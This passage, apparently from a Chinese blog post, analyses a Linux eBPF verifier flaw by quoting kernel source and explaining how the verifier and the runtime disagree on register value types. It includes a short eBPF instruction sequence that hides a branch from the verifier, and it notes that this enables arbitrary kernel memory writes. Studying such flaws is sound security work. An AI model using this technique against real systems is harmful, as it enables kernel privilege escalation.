class="hljs-string">&quot;R0 leaks addr as return value\n&quot;</span>);<br>					<span class="hljs-keyword">return</span> -EACCES;<br>				&#125;<br><br>process_bpf_exit:<br>				insn_idx = pop_stack(env, &amp;prev_insn_idx);<br>				<span class="hljs-keyword">if</span> (insn_idx &lt; <span class="hljs-number">0</span>) &#123;<br>					<span class="hljs-keyword">break</span>;<br>				&#125; <span class="hljs-keyword">else</span> &#123;<br>					do_print_state = <span class="hljs-literal">true</span>;<br>					<span class="hljs-keyword">continue</span>;<br>				&#125;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				err = check_cond_jmp_op(env, insn, &amp;insn_idx);<br>				<span class="hljs-keyword">if</span> (err)<br>					<span class="hljs-keyword">return</span> err;<br>			&#125;<br>		&#125;<br></code></pre></td></tr></table></figure>
查看一下pop_stack函数，函数中先判断env-&gt;head是否为0，如果是就代表没有未检查的路径了。否则将保持的state恢复。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pop_stack</span><span class="hljs-params">(struct verifier_env *env, <span class="hljs-keyword">int</span> *prev_insn_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_stack_elem</span> *<span class="hljs-title">elem</span>;</span><br>	<span class="hljs-keyword">int</span> insn_idx;<br><br>	<span class="hljs-keyword">if</span> (env-&gt;head == <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>	<span class="hljs-built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="hljs-keyword">sizeof</span>(env-&gt;cur_state));<br>	insn_idx = env-&gt;head-&gt;insn_idx;<br>	<span class="hljs-keyword">if</span> (prev_insn_idx)<br>		*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;<br>	elem = env-&gt;head-&gt;next;<br>	kfree(env-&gt;head);<br>	env-&gt;head = elem;<br>	env-&gt;stack_size--;<br>	<span class="hljs-keyword">return</span> insn_idx;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_USED_MAPS 64 <span class="hljs-comment">/* max number of maps accessed by one eBPF program */</span></span><br><br><span class="hljs-comment">/* single container for all structs</span><br><span class="hljs-comment"> * one verifier_env per bpf_check() call</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_env</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> *<span class="hljs-title">prog</span>;</span>		<span class="hljs-comment">/* eBPF program being verified */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_stack_elem</span> *<span class="hljs-title">head</span>;</span> <span class="hljs-comment">/* stack of verifier states to be processed */</span><br>	<span class="hljs-keyword">int</span> stack_size;			<span class="hljs-comment">/* number of states to be processed */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state</span> <span class="hljs-title">cur_state</span>;</span> <span class="hljs-comment">/* current verifier state */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state_list</span> **<span class="hljs-title">explored_states</span>;</span> <span class="hljs-comment">/* search pruning optimization */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">used_maps</span>[<span class="hljs-title">MAX_USED_MAPS</span>];</span> <span class="hljs-comment">/* array of map&#x27;s used by eBPF program */</span><br>	u32 used_map_cnt;		<span class="hljs-comment">/* number of used maps */</span><br>	<span class="hljs-keyword">bool</span> allow_ptr_leaks;<br>&#125;;<br></code></pre></td></tr></table></figure>
然后看一下条件分支的处理代码check_cond_jmp_op，我们可以看到这个检查将跳转分成两种，第一种[1]处是JEQ和JNE，并且是比较的值是立即数的情况，此时就判断立即数是不是等于要比较的寄存器，进行直接跳转。第二种[2]处是其他情况，均需把off+1的值压入栈中作为另一条分支。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check_cond_jmp_op</span><span class="hljs-params">(struct verifier_env *env,</span></span><br><span class="hljs-params"><span class="hljs-function">			     struct bpf_insn *insn, <span class="hljs-keyword">int</span> *insn_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reg_state</span> *<span class="hljs-title">regs</span> =</span> env-&gt;cur_state.regs;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state</span> *<span class="hljs-title">other_branch</span>;</span><br>	u8 opcode = BPF_OP(insn-&gt;code);<br>	<span class="hljs-keyword">int</span> err;<br><br>	<span class="hljs-keyword">if</span> (opcode &gt; BPF_EXIT) &#123;<br>		verbose(<span class="hljs-string">&quot;invalid BPF_JMP opcode %x\n&quot;</span>, opcode);<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>		<span class="hljs-keyword">if</span> (insn-&gt;imm != <span class="hljs-number">0</span>) &#123;<br>			verbose(<span class="hljs-string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		&#125;<br><br>		<span class="hljs-comment">/* check src1 operand */</span><br>		err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br>		<span class="hljs-keyword">if</span> (err)<br>			<span class="hljs-keyword">return</span> err;<br><br>		<span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;<br>			verbose(<span class="hljs-string">&quot;R%d pointer comparison prohibited\n&quot;</span>,<br>				insn-&gt;src_reg);<br>			<span class="hljs-keyword">return</span> -EACCES;<br>		&#125;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;<br>			verbose(<span class="hljs-string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-comment">/* check src2 operand */</span><br>	err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);<br>	<span class="hljs-keyword">if</span> (err)<br>		<span class="hljs-keyword">return</span> err;<br><br>	<span class="hljs-comment">/* detect if R == 0 where R was initialized to zero earlier */</span><br>[<span class="hljs-number">1</span>]	<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>	    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;<br>	    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;<br>	    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;<br>		<span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br>			<span class="hljs-comment">/* if (imm == imm) goto pc+off;</span><br><span class="hljs-comment">			 * only follow the goto, ignore fall-through</span><br><span class="hljs-comment">			 */</span><br>			*insn_idx += insn-&gt;off;<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/* if (imm != imm) goto pc+off;</span><br><span class="hljs-comment">			 * only follow fall-through branch, since</span><br><span class="hljs-comment">			 * that&#x27;s where the program will go</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		&#125;<br>	&#125;<br><br>[<span class="hljs-number">2</span>]	other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="hljs-number">1</span>, *insn_idx);<br>	<span class="hljs-keyword">if</span> (!other_branch)<br>		<span class="hljs-keyword">return</span> -EFAULT;<br><br>	<span class="hljs-comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span><br>	<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>	    insn-&gt;imm == <span class="hljs-number">0</span> &amp;&amp; (opcode == BPF_JEQ ||<br>			       opcode == BPF_JNE) &amp;&amp;<br>	    regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;<br>		<span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br>			<span class="hljs-comment">/* next fallthrough insn can access memory via</span><br><span class="hljs-comment">			 * this register</span><br><span class="hljs-comment">			 */</span><br>			regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;<br>			<span class="hljs-comment">/* branch targer cannot access it, since reg == 0 */</span><br>			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;<br>			other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="hljs-number">0</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;<br>			regs[insn-&gt;dst_reg].type = CONST_IMM;<br>			regs[insn-&gt;dst_reg].imm = <span class="hljs-number">0</span>;<br>		&#125;<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;<br>		verbose(<span class="hljs-string">&quot;R%d pointer comparison prohibited\n&quot;</span>, insn-&gt;dst_reg);<br>		<span class="hljs-keyword">return</span> -EACCES;<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;<br>		   (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;<br><br>		<span class="hljs-keyword">if</span> (opcode == BPF_JEQ) &#123;<br>			<span class="hljs-comment">/* detect if (R == imm) goto</span><br><span class="hljs-comment">			 * and in the target state recognize that R = imm</span><br><span class="hljs-comment">			 */</span><br>			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;<br>			other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/* detect if (R != imm) goto</span><br><span class="hljs-comment">			 * and in the fall-through state recognize that R = imm</span><br><span class="hljs-comment">			 */</span><br>			regs[insn-&gt;dst_reg].type = CONST_IMM;<br>			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (log_level)<br>		print_verifier_state(env);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h5 id="能否直接进行内存读写？"><a href="#能否直接进行内存读写？" class="headerlink" title="能否直接进行内存读写？"></a>能否直接进行内存读写？</h5>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当 r7 和 r8 的值可控就可以达到内存任意写，类似于mov dword ptr[r7], r8这样的操作。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">STX_MEM_DW(<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)<br></code></pre></td></tr></table></figure>
接下来分析一下ST和LD有哪些限制，check_reg_arg[1]处检查寄存器是否访问寄存器的序号是否超过最大值10，如果是SRC_OP检查是否是未初始化的值。否则检查是否要写的地方是rbp，并将要写的寄存器值置为UNKOWN。然后是[2]check_mem_access检查，该函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_LDX) &#123;<br>			<span class="hljs-keyword">enum</span> bpf_reg_type src_reg_type;<br><br>			<span class="hljs-comment">/* check for reserved fields is already done */</span><br><br>			<span class="hljs-comment">/* check src operand */</span><br>[<span class="hljs-number">1</span>]			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br><br>[<span class="hljs-number">1</span>]			err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br><br>			src_reg_type = regs[insn-&gt;src_reg].type;<br><br>			<span class="hljs-comment">/* check that memory (src_reg + off) is readable,</span><br><span class="hljs-comment">			 * the state of dst_reg will be updated by this func</span><br><span class="hljs-comment">			 */</span><br>[<span class="hljs-number">2</span>]			err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,<br>					       BPF_SIZE(insn-&gt;code), BPF_READ,<br>					       insn-&gt;dst_reg);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br><br>			<span class="hljs-keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;<br>				insn_idx++;<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br><br>			<span class="hljs-keyword">if</span> (insn-&gt;imm == <span class="hljs-number">0</span>) &#123;<br>				<span class="hljs-comment">/* saw a valid insn</span><br><span class="hljs-comment">				 * dst_reg = *(u32 *)(src_reg + off)</span><br><span class="hljs-comment">				 * use reserved &#x27;imm&#x27; field to mark this insn</span><br><span class="hljs-comment">				 */</span><br>				insn-&gt;imm = src_reg_type;<br><br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;<br>				   (src_reg_type == PTR_TO_CTX ||<br>				    insn-&gt;imm == PTR_TO_CTX)) &#123;<br>				<span class="hljs-comment">/* ABuser program is trying to use the same insn</span><br><span class="hljs-comment">				 * dst_reg = *(u32*) (src_reg + off)</span><br><span class="hljs-comment">				 * with different pointer types:</span><br><span class="hljs-comment">				 * src_reg == ctx in one branch and</span><br><span class="hljs-comment">				 * src_reg == stack|map in some other branch.</span><br><span class="hljs-comment">				 * Reject it.</span><br><span class="hljs-comment">				 */</span><br>				verbose(<span class="hljs-string">&quot;same insn cannot be used with different pointers\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<br><br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_STX) &#123;<br>			<span class="hljs-keyword">enum</span> bpf_reg_type dst_reg_type;<br><br>			<span class="hljs-keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;<br>				err = check_xadd(env, insn);<br>				<span class="hljs-keyword">if</span> (err)<br>					<span class="hljs-keyword">return</span> err;<br>				insn_idx++;<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br><br>			<span class="hljs-comment">/* check src1 operand */</span><br>[<span class="hljs-number">1</span>]			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br>			<span class="hljs-comment">/* check src2 operand */</span><br>[<span class="hljs-number">1</span>]			err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br><br>			dst_reg_type = regs[insn-&gt;dst_reg].type;<br><br>			<span class="hljs-comment">/* check that memory (dst_reg + off) is writeable */</span><br>[<span class="hljs-number">2</span>]			err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,<br>					       BPF_SIZE(insn-&gt;code), BPF_WRITE,<br>					       insn-&gt;src_reg);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br><br>			<span class="hljs-keyword">if</span> (insn-&gt;imm == <span class="hljs-number">0</span>) &#123;<br>				insn-&gt;imm = dst_reg_type;<br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;<br>				   (dst_reg_type == PTR_TO_CTX ||<br>				    insn-&gt;imm == PTR_TO_CTX)) &#123;<br>				verbose(<span class="hljs-string">&quot;same insn cannot be used with different pointers\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<br><br>		&#125;<br></code></pre></td></tr></table></figure>
以上情况，如果采用MOV这样的赋值指令去读写的话，寄存器类型会判定为IMM，而拒绝。另外一种是用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。而这种方法会在赋值时被设定为UNKNOWN而拒绝读写。<h4 id="bpf-prog-run"><a href="#bpf-prog-run" class="headerlink" title="bpf_prog_run"></a>bpf_prog_run</h4>以上就是对于加载指令的全部检查，可以看到我们能想到的内存读写方法都是会被检测出来的。真正执行的时候代码在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L195">__bpf_prog_run</a>中，其中可以看到所谓的各个寄存器和栈只是这个函数的局部变量。<br>程序维护了一个跳表，根据opcode来进行跳转，而函数中没有任何check，具体实现代码十分简单，就不赘述了。可以发现程序的寄存器变量与check中的寄存器变量不太一样，此时是unsigned long long类型。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> __bpf_prog_run(<span class="hljs-keyword">void</span> *ctx, <span class="hljs-keyword">const</span> struct bpf_insn *insn)<br>&#123;<br>	u64 <span class="hljs-built_in">stack</span>[MAX_BPF_STACK / <span class="hljs-keyword">sizeof</span>(u64)];<br>	u64 regs[MAX_BPF_REG], tmp;<br>	<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *jumptable[<span class="hljs-number">256</span>] = &#123;<br>		[<span class="hljs-number">0</span> ... <span class="hljs-number">255</span>] = &amp;&amp;default_label,<br>		<span class="hljs-comment">/* Now overwrite non-defaults ... */</span><br>        ...<br></code></pre></td></tr></table></figure>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>本漏洞的原因是check函数和真正的函数的执行方法不一致导致的，主要问题是二者寄存器值类型不同。先看下面一段EBPF指令：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">0</span>]: ALU_MOV_K(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xffffffff</span>)	<span class="hljs-comment">/* r9 = (u32)0xFFFFFFFF */</span><br>[<span class="hljs-number">1</span>]: JMP_JNE_K(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xffffffff</span>)	<span class="hljs-comment">/* if (r9 == -1) &#123;       */</span><br>[<span class="hljs-number">2</span>]: ALU64_MOV_K(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">3</span>]: JMP_EXIT(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>)			<span class="hljs-comment">/*   exit(0);            */</span><br>[<span class="hljs-number">4</span>]: ......<br></code></pre></td></tr></table></figure>
第0条指令是将0xffffffff放入r9寄存器中，当在do_check函数中时，在[1]处会直接将0xffffffff复制给r9，并将type赋值为IMM。在第[1]条指令，比较r9 == 0xffffffff，相等时就执行[2]、[3]，否则跳到[4]。根据前文对退出的分析，这个地方在do_check看来是一个恒等式，不会将另外一条路径压入stack，直接退出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;<br>			err = check_alu_op(env, insn);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err；<br>		&#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> check_alu_op(struct verifier_env *env, struct bpf_insn *insn)<br>&#123;<br>	struct reg_state *regs = env-&gt;cur_state.regs;<br>	u8 opcode = BPF_OP(insn-&gt;code);<br>	<span class="hljs-keyword">int</span> err;<br><br>	<span class="hljs-keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;<br>		... ...<br>		&#125;<br><br>		<span class="hljs-comment">/* check src operand */</span><br>		.......<br><br>		<span class="hljs-comment">/* check dest operand */</span><br>		.......<br><br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_MOV) &#123;<br><br>		<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>			<span class="hljs-keyword">if</span> (insn-&gt;imm != <span class="hljs-number">0</span> || insn-&gt;off != <span class="hljs-number">0</span>) &#123;<br>				verbose(<span class="hljs-string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<br><br>			<span class="hljs-comment">/* check src operand */</span><br>			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> err;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="hljs-number">0</span>) &#123;<br>				verbose(<span class="hljs-string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<br>		&#125;<br><br>		<span class="hljs-comment">/* check dest operand */</span><br>		err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);<br>		<span class="hljs-keyword">if</span> (err)<br>			<span class="hljs-keyword">return</span> err;<br><br>		<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>			<span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;<br>				<span class="hljs-comment">/* case: R1 = R2</span><br><span class="hljs-comment">				 * copy register state to dest reg</span><br><span class="hljs-comment">				 */</span><br>				regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				<span class="hljs-keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;<br>					verbose(<span class="hljs-string">&quot;R%d 